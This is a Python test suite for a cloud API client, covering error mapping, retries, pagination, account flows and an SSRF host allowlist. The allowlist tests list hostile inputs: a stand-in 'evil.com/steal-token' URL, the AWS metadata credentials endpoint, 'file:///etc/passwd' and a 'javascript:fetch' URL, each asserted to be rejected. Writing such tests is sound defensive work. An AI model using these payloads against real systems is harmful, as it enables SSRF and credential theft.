"""Cloud client: retry, circuit breaker, error mapping."""
from __future__ import annotations

import httpx
import pytest
import respx
import structlog

from backend.clients.ndi_cloud import NdiCloudClient
from backend.errors import (
    AuthInvalidCredentials,
    AuthRequired,
    BulkFetchTooLarge,
    CloudTimeout,
    CloudUnreachable,
    Forbidden,
    NotFound,
    QueryInvalidNegation,
)


@pytest.mark.asyncio
async def test_login_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/login").respond(
            200, json={"token": "jwt-abc", "user": {"id": "u1", "email": "a@b"}},
        )
        client = NdiCloudClient()
        await client.start()
        try:
            result = await client.login("a@b", "pw")
            assert result.access_token == "jwt-abc"
            assert result.user == {"id": "u1", "email": "a@b"}
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_login_invalid_credentials() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/login").respond(401, json={"errors": "Unable to login"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(AuthInvalidCredentials):
                await client.login("a@b", "wrong")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_get_dataset_404_maps_to_not_found() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/xxx").respond(404, json={"error": "not found"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(NotFound):
                await client.get_dataset("xxx")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_cloud_401_on_authed_endpoint_raises_auth_required() -> None:
    """Cloud 401 on any non-login authed endpoint must surface as AuthRequired.

    After ADR-008 retired the refresh path, this is the translation that routes
    an expired/revoked/permission-lost access token into 401 + AUTH_REQUIRED
    with recovery=login. Before PR-17, a 401 raised an internal
    `_UpstreamUnauthorized` marker that no layer caught — the generic Exception
    handler turned it into 500. This test pins the corrected behavior.
    """
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/zzz").respond(401, json={"error": "token expired"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(AuthRequired):
                await client.get_dataset("zzz", access_token="expired-token")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_get_dataset_403_maps_to_forbidden() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/yyy").respond(403, json={"error": "forbidden"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(Forbidden):
                await client.get_dataset("yyy")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_bulk_fetch_rejects_over_500_ids() -> None:
    client = NdiCloudClient()
    await client.start()
    try:
        with pytest.raises(BulkFetchTooLarge):
            await client.bulk_fetch("d1", ["abc"] * 501)
    finally:
        await client.close()


@pytest.mark.asyncio
async def test_retry_on_5xx() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        call_count = 0

        def handler(request: httpx.Request) -> httpx.Response:
            nonlocal call_count
            call_count += 1
            if call_count < 2:
                return httpx.Response(503)
            return httpx.Response(200, json={"name": "ok"})

        router.get("/datasets/retry-test").mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            result = await client.get_dataset("retry-test")
            assert result == {"name": "ok"}
            assert call_count == 2
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_cloud_timeout_raises_typed() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/slow").mock(side_effect=httpx.TimeoutException("timeout"))
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudTimeout):
                await client.get_dataset("slow")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_network_error_raises_cloud_unreachable() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.get("/datasets/gone").mock(side_effect=httpx.ConnectError("refused"))
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudUnreachable):
                await client.get_dataset("gone")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_ndiquery_paginates() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        def handler(request: httpx.Request) -> httpx.Response:
            page = int(request.url.params.get("page", "1"))
            # 1500 total docs; pages of size 1000.
            if page == 1:
                docs = [{"id": f"d{i}"} for i in range(1000)]
            elif page == 2:
                docs = [{"id": f"d{i}"} for i in range(1000, 1500)]
            else:
                docs = []
            return httpx.Response(200, json={
                "documents": docs, "number_matches": 1500, "page": page, "pageSize": 1000,
            })
        router.post("/ndiquery").mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            body = await client.ndiquery(
                searchstructure=[{"operation": "isa", "param1": "subject"}],
                scope="public",
            )
            assert len(body["documents"]) == 1500
            assert body["totalItems"] == 1500
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_ndiquery_invalid_negation_maps_typed() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/ndiquery").respond(400, json={"error": "~or is not allowed"})
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(QueryInvalidNegation):
                await client.ndiquery(
                    searchstructure=[{"operation": "~or", "param1": [], "param2": []}],
                    scope="public",
                )
        finally:
            await client.close()


# ---------------------------------------------------------------------------
# download_file host allowlist (PR-6)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_download_from_allowlisted_host_sends_bearer() -> None:
    """Phase-agnostic: if the host is on the allowlist, Authorization is sent."""
    captured: dict[str, str] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization", "")
        return httpx.Response(200, content=b"FILE_BYTES")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://mybucket.s3.amazonaws.com/path/file.nbf").mock(
            side_effect=handler,
        )
        client = NdiCloudClient()
        await client.start()
        try:
            body = await client.download_file(
                "https://mybucket.s3.amazonaws.com/path/file.nbf",
                access_token="jwt-abc",
            )
            assert body == b"FILE_BYTES"
            assert captured["authorization"] == "Bearer jwt-abc"
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_download_from_off_allowlist_host_hard_rejects() -> None:
    """Audit 2026-04-23 (#49): off-allowlist host raises BinaryNotFound,
    does NOT forward the Bearer token, and does NOT fetch the URL. This
    closes the SSRF where a dataset could point `files.file_info.locations`
    at internal infra and receive the bytes back as a 'binary'."""
    from backend.errors import BinaryNotFound

    touched = {"fetched": False}

    def handler(request: httpx.Request) -> httpx.Response:  # pragma: no cover
        touched["fetched"] = True
        return httpx.Response(200, content=b"EVIL")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://evil.com/steal-token").mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            with (
                structlog.testing.capture_logs() as logs,
                pytest.raises(BinaryNotFound),
            ):
                await client.download_file(
                    "https://evil.com/steal-token?X-Amz-Signature=SECRET",
                    access_token="jwt-abc",
                )
            assert touched["fetched"] is False, "must not fetch off-allowlist URL"
            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
            assert events, f"expected off_allowlist_host warning, got {logs}"
            assert events[0]["host"] == "evil.com"
            # url_pattern in log must NOT leak the signed-URL query.
            assert "X-Amz-Signature" not in events[0]["url_pattern"]
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_download_metadata_ip_blocked_even_without_token() -> None:
    """AWS metadata IP (169.254.169.254) is not on the allowlist and must be
    hard-rejected, with or without a token. The bearer is irrelevant — what
    matters is that we do not fetch the URL at all and relay the bytes."""
    from backend.errors import BinaryNotFound

    touched = {"fetched": False}

    def handler(request: httpx.Request) -> httpx.Response:  # pragma: no cover
        touched["fetched"] = True
        return httpx.Response(200, content=b"SECRET")

    with respx.mock(assert_all_called=False) as router:
        router.get(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        ).mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(BinaryNotFound):
                await client.download_file(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                )
            assert touched["fetched"] is False
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_download_non_http_scheme_rejected() -> None:
    """Non-http(s) schemes (file://, gopher://, javascript:) are rejected
    before any I/O. Defense in depth — httpx itself only supports http(s)
    but this keeps the guarantee explicit."""
    from backend.errors import BinaryNotFound

    client = NdiCloudClient()
    await client.start()
    try:
        for url in (
            "file:///etc/passwd",
            "gopher://evil.com/",
            "javascript:fetch('/api/auth/me')",
            "//no-scheme.example.com/path",
            "",
        ):
            with (
                structlog.testing.capture_logs() as logs,
                pytest.raises(BinaryNotFound),
            ):
                await client.download_file(url, access_token="jwt-abc")
            events = [
                le for le in logs
                if le.get("event") in {"cloud.download.invalid_scheme", "cloud.download.off_allowlist_host"}
            ]
            assert events, f"expected rejection log for {url!r}, got {logs}"
    finally:
        await client.close()


@pytest.mark.asyncio
async def test_download_from_cloud_host_always_allowlisted() -> None:
    """Cloud host (from NDI_CLOUD_URL) is added to the runtime allowlist
    dynamically — Bearer is forwarded without a warning."""
    captured: dict[str, str] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        captured["authorization"] = request.headers.get("Authorization", "")
        return httpx.Response(200, content=b"INTERNAL")

    with respx.mock(assert_all_called=False) as router:
        router.get("https://api.example.test/internal/file").mock(side_effect=handler)
        client = NdiCloudClient()
        await client.start()
        try:
            with structlog.testing.capture_logs() as logs:
                body = await client.download_file(
                    "https://api.example.test/internal/file",
                    access_token="jwt-abc",
                )
            assert body == b"INTERNAL"
            assert captured["authorization"] == "Bearer jwt-abc"
            events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
            assert not events, "cloud host should not log the off-allowlist warning"
        finally:
            await client.close()


# ---------------------------------------------------------------------------
# B3: account-lifecycle proxy methods
#
# Each method wraps a cloud-side endpoint exposed by ndi-cloud-node:
#   signup                  → POST /users
#   forgot_password         → POST /auth/password/forgot
#   reset_password          → POST /auth/password/confirm
#   confirm_email           → POST /auth/verify
#   resend_confirmation     → POST /auth/confirmation/resend
#
# The cloud serializes Cognito error codes into the body as `{ code: "..." }`
# (and HTTP 400 in nearly every failure path). The client method translates
# those Cognito codes into typed BrowserError subclasses BEFORE returning,
# so the wire never carries Cognito strings — that's the contract the
# router relies on.
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_signup_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/users").respond(
            200,
            json={
                "user": {"id": "u-new", "email": "new@example.test", "name": "New"},
                "organizations": [],
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            body = await client.signup(
                email="new@example.test", password="GoodPass1!", name="New",
            )
            assert body["user"]["email"] == "new@example.test"
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_signup_existing_email_maps_to_typed_error() -> None:
    """UsernameExistsException → EmailAlreadyExists. The Cognito string must
    NOT propagate; the typed error has its own user-facing message."""
    from backend.errors import EmailAlreadyExists

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/users").respond(
            400,
            json={
                "errors": "Unable to create user in AWS Cognito",
                "code": "UsernameExistsException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(EmailAlreadyExists):
                await client.signup(
                    email="dup@example.test", password="GoodPass1!", name="Dup",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_signup_weak_password_maps_to_typed_error() -> None:
    """InvalidPasswordException → WeakPassword."""
    from backend.errors import WeakPassword

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/users").respond(
            400,
            json={
                "errors": "Unable to create user in AWS Cognito",
                "code": "InvalidPasswordException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(WeakPassword):
                await client.signup(
                    email="weak@example.test", password="abc", name="Weak",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_signup_network_error_raises_cloud_unreachable() -> None:
    """A network error must surface as CloudUnreachable, not bubble raw."""
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/users").mock(side_effect=httpx.ConnectError("refused"))
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudUnreachable):
                await client.signup(
                    email="net@example.test", password="GoodPass1!", name="Net",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_forgot_password_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password/forgot").respond(
            200,
            json={
                "CodeDeliveryDetails": {
                    "Destination": "u***@example.test",
                    "DeliveryMedium": "EMAIL",
                    "AttributeName": "email",
                },
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            await client.forgot_password(email="user@example.test")
            # Method returns None on success — no body to assert.
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_forgot_password_user_not_found_swallowed_to_avoid_enumeration() -> None:
    """SECURITY: UserNotFoundException must NOT raise — the proxy returns
    success unconditionally so a caller cannot enumerate which emails are
    registered by observing the response code/timing."""
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password/forgot").respond(
            400,
            json={
                "errors": "Unable to send Forgot Password Link",
                "code": "UserNotFoundException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            # Must NOT raise — silently treated as success.
            await client.forgot_password(email="ghost@example.test")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_forgot_password_timeout_raises_typed() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password/forgot").mock(
            side_effect=httpx.TimeoutException("timeout"),
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudTimeout):
                await client.forgot_password(email="slow@example.test")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_reset_password_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password/confirm").respond(
            200, json={"message": "Password reset", "code": "Success!"},
        )
        client = NdiCloudClient()
        await client.start()
        try:
            await client.reset_password(
                email="user@example.test",
                code="123456",
                new_password="NewGood1!",
            )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_reset_password_wrong_code_maps_to_typed_error() -> None:
    """CodeMismatchException → InvalidVerificationCode."""
    from backend.errors import InvalidVerificationCode

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        # The cloud's confirmForgotPassword always uses res.json() (200),
        # embedding the failure code in the body. We must inspect the body
        # even on 2xx and translate accordingly.
        router.post("/auth/password/confirm").respond(
            200,
            json={
                "errors": "Unable to reset password",
                "code": "CodeMismatchException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(InvalidVerificationCode):
                await client.reset_password(
                    email="user@example.test",
                    code="WRONG1",
                    new_password="NewGood1!",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_reset_password_expired_code_maps_to_typed_error() -> None:
    """ExpiredCodeException → VerificationCodeExpired."""
    from backend.errors import VerificationCodeExpired

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password/confirm").respond(
            200,
            json={
                "errors": "Unable to reset password",
                "code": "ExpiredCodeException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(VerificationCodeExpired):
                await client.reset_password(
                    email="user@example.test",
                    code="OLD123",
                    new_password="NewGood1!",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_reset_password_weak_password_maps_to_typed_error() -> None:
    """InvalidPasswordException → WeakPassword."""
    from backend.errors import WeakPassword

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password/confirm").respond(
            200,
            json={
                "errors": "Unable to reset password",
                "code": "InvalidPasswordException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(WeakPassword):
                await client.reset_password(
                    email="user@example.test",
                    code="123456",
                    new_password="abc",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_confirm_email_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/verify").respond(
            200, json={"id": "u1", "email": "new@example.test", "isValidated": True},
        )
        client = NdiCloudClient()
        await client.start()
        try:
            await client.confirm_email(
                email="new@example.test", code="123456",
            )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_confirm_email_wrong_code_maps_to_typed_error() -> None:
    """CodeMismatchException → InvalidVerificationCode."""
    from backend.errors import InvalidVerificationCode

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/verify").respond(
            400,
            json={
                "errors": "Unable to authorize user",
                "code": "CodeMismatchException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(InvalidVerificationCode):
                await client.confirm_email(
                    email="new@example.test", code="WRONG1",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_confirm_email_expired_code_maps_to_typed_error() -> None:
    """ExpiredCodeException → VerificationCodeExpired."""
    from backend.errors import VerificationCodeExpired

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/verify").respond(
            400,
            json={
                "errors": "Unable to authorize user",
                "code": "ExpiredCodeException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(VerificationCodeExpired):
                await client.confirm_email(
                    email="new@example.test", code="OLD123",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_confirm_email_already_confirmed_maps_to_typed_error() -> None:
    """NotAuthorizedException with 'already confirmed' → EmailAlreadyVerified."""
    from backend.errors import EmailAlreadyVerified

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/verify").respond(
            400,
            json={
                "errors": "Unable to authorize user",
                "code": "NotAuthorizedException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(EmailAlreadyVerified):
                await client.confirm_email(
                    email="dup@example.test", code="123456",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_resend_confirmation_success() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/confirmation/resend").respond(
            200, json={"confirmationResent": True},
        )
        client = NdiCloudClient()
        await client.start()
        try:
            await client.resend_confirmation(email="new@example.test")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_resend_confirmation_already_verified_maps_to_typed_error() -> None:
    """InvalidParameterException ('User is already confirmed') →
    EmailAlreadyVerified."""
    from backend.errors import EmailAlreadyVerified

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/confirmation/resend").respond(
            400,
            json={
                "errors": "AWS Cognito is unable to resend confirmation to user",
                "code": "InvalidParameterException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(EmailAlreadyVerified):
                await client.resend_confirmation(email="done@example.test")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_resend_confirmation_user_not_found_swallowed_to_avoid_enumeration() -> None:
    """SECURITY: UserNotFoundException must not differentiate from success.
    Same enumeration-resistance contract as forgot_password."""
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/confirmation/resend").respond(
            400,
            json={
                "errors": "AWS Cognito is unable to resend confirmation to user",
                "code": "UserNotFoundException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            # Must NOT raise.
            await client.resend_confirmation(email="ghost@example.test")
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_resend_confirmation_network_error_raises_cloud_unreachable() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/confirmation/resend").mock(
            side_effect=httpx.ConnectError("refused"),
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudUnreachable):
                await client.resend_confirmation(email="net@example.test")
        finally:
            await client.close()


# ---------------------------------------------------------------------------
# change_password (B3 close-out)
# ---------------------------------------------------------------------------
#
# Distinct from reset_password — change_password is the AUTHENTICATED
# flow (user is signed in, provides the old password as proof). The
# bespoke piece is the ``NotAuthorizedException`` translation: at this
# endpoint that code means "wrong old password" (NOT "user already
# verified", which is its meaning at /auth/verify).

@pytest.mark.asyncio
async def test_change_password_success() -> None:
    """Cloud `POST /auth/password` returns 200 with a success message
    on a clean rotation. Method returns None."""
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        cloud_route = router.post(
            "/auth/password",
            headers={"Authorization": "Bearer my-access-token"},
        ).respond(200, json={"message": "Password changed successfully"})
        client = NdiCloudClient()
        await client.start()
        try:
            await client.change_password(
                access_token="my-access-token",
                old_password="OldGood1!",
                new_password="NewGood2!",
            )
            assert cloud_route.called
            # Verify the body shape matches the cloud's expected
            # ``oldPassword``/``newPassword`` (not the frontend's
            # ``currentPassword`` naming).
            import json as _json
            body = _json.loads(cloud_route.calls.last.request.content)
            assert body == {"oldPassword": "OldGood1!", "newPassword": "NewGood2!"}
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_change_password_wrong_old_password_maps_to_auth_invalid_credentials() -> None:
    """ENDPOINT-SPECIFIC: NotAuthorizedException at /auth/password means
    'wrong old password' — NOT the confirm-email "already verified"
    meaning. Surface as AuthInvalidCredentials so the form highlights
    the current-password field."""
    from backend.errors import AuthInvalidCredentials

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password").respond(
            400,
            json={"errors": "Unable to authenticate", "code": "NotAuthorizedException"},
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(AuthInvalidCredentials):
                await client.change_password(
                    access_token="my-access-token",
                    old_password="WrongOld!",
                    new_password="NewGood2!",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_change_password_weak_new_password_maps_to_typed_error() -> None:
    """InvalidPasswordException → WeakPassword via the shared translator."""
    from backend.errors import WeakPassword

    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password").respond(
            400,
            json={
                "errors": "Unable to change password",
                "code": "InvalidPasswordException",
            },
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(WeakPassword):
                await client.change_password(
                    access_token="my-access-token",
                    old_password="OldGood1!",
                    new_password="weak",
                )
        finally:
            await client.close()


@pytest.mark.asyncio
async def test_change_password_network_error_raises_cloud_unreachable() -> None:
    async with respx.mock(base_url="https://api.example.test/v1") as router:
        router.post("/auth/password").mock(
            side_effect=httpx.ConnectError("refused"),
        )
        client = NdiCloudClient()
        await client.start()
        try:
            with pytest.raises(CloudUnreachable):
                await client.change_password(
                    access_token="my-access-token",
                    old_password="OldGood1!",
                    new_password="NewGood2!",
                )
        finally:
            await client.close()
